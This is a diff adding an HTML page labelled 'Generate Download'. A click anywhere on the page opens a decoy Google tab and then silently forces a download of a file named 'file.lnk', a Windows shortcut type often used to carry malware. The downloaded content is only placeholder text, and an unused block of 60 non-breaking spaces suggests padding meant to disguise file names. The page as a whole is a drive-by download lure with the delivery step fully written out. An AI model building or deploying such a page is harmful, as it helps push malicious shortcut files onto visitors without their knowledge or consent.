@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Generate Download</title>
+  <style>
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: sans-serif;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+click
+
+<script>
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+document.addEventListener("click", async function triggerOnce() {
+  document.removeEventListener("click", triggerOnce);
+
+  window.open("https://google.com", "_blank");
+
+  await sleep(1000);
+
+  const data = "binary data placeholder";
+  const nbsp = "\u00A0".repeat(60);
+
+  const blob = new Blob([data], {
+    type: "application/octet-stream"
+  });
+
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+
+  a.href = url;
+  a.download = "./file.lnk";
+
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  URL.revokeObjectURL(url);
+});
+</script>
+
+</body>
+</html>
